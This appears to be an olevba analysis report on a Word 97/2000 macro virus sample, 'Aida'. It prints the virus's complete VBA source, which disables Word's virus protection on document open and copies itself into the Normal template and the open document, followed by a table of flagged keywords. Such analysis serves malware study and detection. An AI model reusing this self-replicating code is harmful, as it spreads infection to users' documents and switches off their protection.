olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aida
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aida - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Aida - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
---------------------------------------------------------------
Virus name:             WM97/2K.Aida aka Macro.Word97.Aida
Virus author:           e [ax] / EBVL / VXI

Virus description:

- Infection method:     SIM [String Infection Method]
- Polymorphic:          no
- Encryption:           no
- Payload:              yes
---------------------------------------------------------------

'Aida
Private Sub Document_Open(): With Options: Const nula = 0
.VirusProtection = nula
End With: Dim a, b, c, d
a = Strings.RTrim(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, _
ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines))
With NormalTemplate.VBProject.VBComponents(1).CodeModule
c = .Lines(1, 1)
If c <> "'Aida" Then
.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1) _
.CodeModule.CountOfLines
.InsertLines 1, a
End If
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
d = .Lines(1, 1)
If d <> "'Aida" Then
.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1) _
.CodeModule.CountOfLines
.InsertLines 1, a
End If: End With
If Day(Now()) = 14 And Month(Now()) = 9 Then
With Selection
.Font.Bold = True: .Font.Color = wdColorViolet
.Font.Size = 26: .Font.Emboss = True
.Font.Animation = wdAnimationSparkleText
.Font.Shadow = True: .ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.Text = "Aida: Where ever You are, You are only one that I loved truely!"
End With
End If
'WM97/2K.Aida by e[ax]
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

